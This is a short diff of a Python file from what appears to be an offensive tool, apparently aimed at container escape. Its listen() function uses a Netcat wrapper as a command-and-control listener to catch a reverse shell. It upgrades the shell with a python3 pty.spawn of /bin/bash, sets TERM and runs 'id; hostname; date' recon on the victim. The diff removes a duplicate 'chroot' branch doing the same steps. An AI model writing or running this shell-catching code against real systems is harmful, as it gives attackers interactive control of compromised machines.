@@ -43,18 +43,6 @@ def listen(c2, method):
         shellListener.send(b'\x0C')
         shellListener.send(bytes('id; hostname; date', 'utf-8'))
         shellListener.send(b'\x0D')
-    
-    elif method == 'chroot':
-        shellListener = nclib.Netcat(listen=(hostIP, hostPort), log_send=dockerLog, log_recv=dockerLog)
-        shellListener.send(bytes('python3 -c \'import pty; pty.spawn("/bin/bash")\'', 'utf-8'))
-        shellListener.send(b'\x0D')
-        time.sleep(1.5)
-        shellListener.send(bytes('export TERM=screen', 'utf-8'))
-        shellListener.send(b'\x0D')
-        time.sleep(1.5)
-        shellListener.send(b'\x0C')
-        shellListener.send(bytes('id; hostname; date', 'utf-8'))
-        shellListener.send(b'\x0D')
 
     shellListener.interact()
 
